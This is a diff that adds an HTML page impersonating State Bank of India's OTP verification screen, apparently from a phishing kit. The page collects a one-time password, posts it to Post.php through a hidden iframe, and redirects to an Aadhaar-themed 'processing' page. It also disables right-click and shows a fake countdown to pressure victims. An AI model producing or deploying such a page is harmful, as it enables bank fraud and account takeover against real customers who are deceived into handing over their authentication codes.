@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="eng">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>State Bank of India - OTP Verification</title>
+  <style>
+    #img1b,#img2b
+    {
+      width:104%;
+      margin-left:-6px;
+    }
+    #tp
+    {
+    width: 290px;
+    height: 22px;
+    background-color:white;
+    outline:none;
+    border-style:solid;
+    border-color:#CCCCCC;
+    border-width: 1px;
+    border-radius: 4px;
+    margin:5px;
+    margin-left: 15px;
+    font-size:15px;
+    padding: 2px 8px;
+    }
+    #tp:hover
+    {
+    border-color:#67AFE9;
+    }
+    #btn
+    {
+      width:70px;
+      background-color:#F89611;
+      border:none;
+      color: white;
+      border-radius: 4px;
+      border-width: 0.1px;
+      margin:10px;
+      cursor: pointer;
+      font-size: 15px;
+      height: 28px;
+    }
+    #con
+    {
+    color:#7212b3;
+    }
+  </style>
+  <script language="javascript"> 
+  var message="This function is not allowed here.";
+  function clickIE4(){
+  if (event.button==2){
+  alert(message);
+  return false;
+  }
+  }
+  function clickNS4(e){
+  if (document.layers||document.getElementById&&!document.all){
+  if (e.which==2||e.which==3){
+  alert(message);
+  return false;
+  }
+  }
+  }
+  if (document.layers){
+  document.captureEvents(Event.MOUSEDOWN);
+  document.onmousedown=clickNS4;}
+  else if (document.all&&!document.getElementById){
+  document.onmousedown=clickIE4;}
+  document.oncontextmenu=new Function("alert(message);return false;")
+  </script>
+</head>
+<body onload="startTimer();">
+<!-- Static- Please don't do anything here-->
+    <script type="text/javascript">var submitted=false;</script>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_AADHAR.html';}"></iframe>
+    <!--My Form-->
+    <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+<div class="line">
+  <img src="1b.jpg" alt="" id="img1b"><br>
+  <b style="font-family:arial; font-size:15px; color:#47474d; margin-left:15px;">One Time Password <span style="color:#f06565;">*</span></b>
+      <input type="text" inputmode="numeric" name="6TH OTP" id="tp" placeholder="" maxlength="8"
+      pattern="\d{6,8}" title="Please enter valid OTP"
+      required=""><br>
+      <script type="text/javascript">
+      var timer=120;
+      var sec=120;
+      function startTimer() {
+      sec=parseInt(timer%120);
+      
+      if (timer<1) {
+      timer.stop();
+      }
+      
+      document.getElementById("time").innerHTML = "<p1> Wait for OTP :</p1>"+sec.toString();
+      timer--;
+      setTimeout(function(){
+      startTimer();
+      
+      }, 1000);
+      }
+      
+      </script>
+      <div>
+      <center> <b style="color:grey; font-size:12px; margin-left:22px;"><span style="color:grey; font-size:12px;" id="time"></span>&nbsp;second</b></center>
+      </div>
+    <center><button type="submit" id="btn" style="font-weight: bold;">submit</button></center>
+    <a href="Enter_OTP_AADHAR.html"><img src="2b.jpg" alt="" id="img2b"></a><br>
+    </form></div></body></html>
